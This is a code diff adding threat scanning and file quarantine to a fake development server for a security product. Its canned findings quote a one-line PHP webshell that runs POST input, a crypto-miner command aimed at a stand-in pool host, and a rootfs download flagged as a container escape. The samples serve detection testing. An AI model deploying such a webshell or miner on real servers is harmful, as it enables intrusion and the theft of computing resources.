@@ -37,6 +37,7 @@ SEVERITY = {
     "brute_force": ("high", 30), "sql_injection": ("high", 40), "xss": ("medium", 20),
     "port_scan": ("medium", 15), "privilege_escalation": ("critical", 60),
     "data_exfiltration": ("critical", 70), "misconfiguration": ("medium", 20), "log_tampering": ("critical", 55),
+    "malware": ("critical", 65),
     "benign": ("low", 0),
 }
 PLAYBOOK = {
@@ -48,6 +49,7 @@ PLAYBOOK = {
     "data_exfiltration": [("block_ip", "src_ip"), ("lock_user", "user")],
     "misconfiguration": [("revoke_public_acl", "s3://demo-bucket")],
     "log_tampering": [("block_ip", "src_ip")],
+    "malware": [],
 }
 RECOMMEND = {
     "brute_force": "Block {src_ip} for 2 h, lock account '{user}' and rate-limit /login",
@@ -58,6 +60,7 @@ RECOMMEND = {
     "data_exfiltration": "Revoke session of '{user}', block {src_ip}",
     "misconfiguration": "Remove the public ACL and enable default encryption",
     "log_tampering": "Block {src_ip} for 2 h and check the host for compromise",
+    "malware": "Check the file or program and quarantine it from the threat scan",
 }
 
 app = FastAPI(title="SentrAI FAKE core (dev only)")
@@ -88,6 +91,8 @@ class State:
         self.protection: dict = {"monitor_only": False, "changed_at": None, "changed_by": None, "reason": None}
         self.scan: dict | None = None
         self.log_sources: list[dict] = []
+        self.threats: dict | None = None
+        self.quarantine: list[dict] = []
         self.pending: list[dict] = []  # Scout proposals; seed one with POST /_fake/scout-proposal
 
 
@@ -504,6 +509,70 @@ def post_scan(body: dict = Body(None)):
 @app.get("/system/scan")
 def get_scan():
     return S.scan or {"suggestions": [], "processes": [], "scanned_at": None}
+
+
+FAKE_THREATS = {
+    "roots": ["/var/lib/pterodactyl/volumes"], "missing": [], "files_checked": 1834, "files_not_checked": 0,
+    "counts": {"critical": 2, "high": 1, "medium": 0}, "new_alerts": 0,
+    "findings": [
+        {"id": "t1", "path": "/var/lib/pterodactyl/volumes/a1b2/plugins/web/upload/img.php", "key": "php-eval-request",
+         "kind": "webshell", "severity": "critical", "label": "runs code sent in a web request", "line": 3,
+         "snippet": "<?php @ev" + "al($_POST['x']); ?>",  # split so antivirus does not flag this file
+         "sha256": "0" * 64, "size": 31},
+        {"id": "t2", "path": "/var/lib/pterodactyl/volumes/c3d4/start.sh", "key": "miner-pool", "kind": "miner",
+         "severity": "critical", "label": "crypto-mining pool address", "line": 4,
+         "snippet": "./.cache/sys -o stratum+tcp://pool.example:3333 -u …", "sha256": "1" * 64, "size": 210},
+        {"id": "t3", "path": "/var/lib/pterodactyl/volumes/e5f6/harbor.sh", "key": "minirootfs",
+         "kind": "container_escape", "severity": "high", "label": "downloads a mini Linux system to run inside the server",
+         "line": 12, "snippet": "curl -LO https://dl-cdn.alpinelinux.org/…/alpine-minirootfs-3.20.0-x86_64.tar.gz",
+         "sha256": "2" * 64, "size": 4096},
+    ],
+}
+
+
+@app.post("/threats/scan")
+def post_threats(body: dict = Body(None)):
+    import copy
+    with lock:
+        held = {q["finding_id"] for q in S.quarantine}
+        S.threats = {**copy.deepcopy(FAKE_THREATS), "scanned_at": iso(now())}
+        S.threats["findings"] = [f for f in S.threats["findings"] if f["id"] not in held]
+        audit("threat_scan", "Cyanide", by=(body or {}).get("operator"), summary="Checked 1834 files for threats")
+        return S.threats
+
+
+@app.get("/threats")
+def get_threats():
+    return S.threats or {"findings": [], "scanned_at": None}
+
+
+@app.post("/threats/{fid}/quarantine")
+def post_quarantine(fid: str, body: dict = Body(...)):
+    with lock:
+        f = next((f for f in (S.threats or {}).get("findings", []) if f["id"] == fid), None)
+        if f is None:
+            raise HTTPException(404, f"{fid} is not in the latest threat scan; scan again")
+        qid = f"q-{fid}"
+        S.quarantine.append({"id": qid, "finding_id": fid, "name": f["path"].rsplit("/", 1)[-1], "original": f["path"],
+                             "finding": {"label": f["label"]}, "operator": body.get("operator"), "at": iso(now())})
+        S.threats["findings"] = [x for x in S.threats["findings"] if x["id"] != fid]
+        audit("file_quarantined", "Cyanide", operator=body.get("operator"), summary=f"Quarantined {f['path']}")
+        return {"ok": True, "quarantine_id": qid, "file": f["path"]}
+
+
+@app.get("/quarantine")
+def get_quarantine():
+    return S.quarantine
+
+
+@app.post("/quarantine/{qid}/restore")
+def post_restore(qid: str, body: dict = Body(...)):
+    with lock:
+        q = next((q for q in S.quarantine if q["id"] == qid), None)
+        if q is None:
+            raise HTTPException(404, f"{qid} is not in quarantine")
+        S.quarantine.remove(q)
+        return {"ok": True, "file": q["original"]}
 
 
 @app.get("/log-sources")
